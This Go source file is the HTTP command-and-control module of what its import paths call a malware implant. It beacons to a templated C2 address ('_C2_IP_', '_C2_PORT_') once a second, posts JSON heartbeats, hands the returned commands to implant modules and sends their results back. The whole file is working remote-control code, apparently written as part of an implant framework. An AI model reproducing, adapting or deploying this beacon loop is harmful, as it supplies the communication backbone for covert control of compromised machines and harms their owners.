package http_network

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"malware/common/messages"
	"malware/implant/included_modules"
	"net/http"
	"time"

	"github.com/golang/protobuf/jsonpb"
)

type state struct {
	running bool
}

type settings struct {
	state *state
	host  string
}

var marshal = &jsonpb.Marshaler{}

func (settings settings) sendMessage(r *messages.CheckCmdRequest) *messages.CheckCmdReply {
	req_string, err := marshal.MarshalToString(r) //r.XXX_Marshal([]byte{}, true)
	if err != nil {
		return nil
	}

	req, err := http.NewRequest("POST", "http://"+settings.host, bytes.NewBufferString(req_string))
	req.Header.Set("Content-Type", "application/json")

	if err != nil {
		return nil
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	msg := &messages.CheckCmdReply{}
	err = jsonpb.UnmarshalString(string(body), msg) //msg.XXX_Unmarshal(body)

	if err != nil {
		return nil
	}

	return msg
}

func (settings *settings) callback(msg *messages.CheckCmdRequest) {
	settings.sendMessage(msg)

}

// Initialise connection
func (settings settings) doConnection() {
	// Send a heartbeat message to ensure connection
	reply := settings.sendMessage(messages.Implant_heartbeat(time.Now().Unix()))
	if reply == nil {
		return
	}

	if included_modules.HandleMessage(reply, settings.callback) {
		settings.state.running = false
	}
}

func (settings settings) listenServer() {
	settings.state.running = true

	for settings.state.running {
		settings.doConnection()

		time.Sleep(1 * time.Second)
	}
}

func (settings settings) HandleMessage(*messages.CheckCmdReply, func(*messages.CheckCmdRequest)) bool {
	return false
}

func Init() {
	port := int32(_C2_PORT_)
	ip := "_C2_IP_"
	state := &state{}
	host := fmt.Sprintf("%s:%d", ip, port)

	settings := settings{state, host}

	settings.listenServer()
}
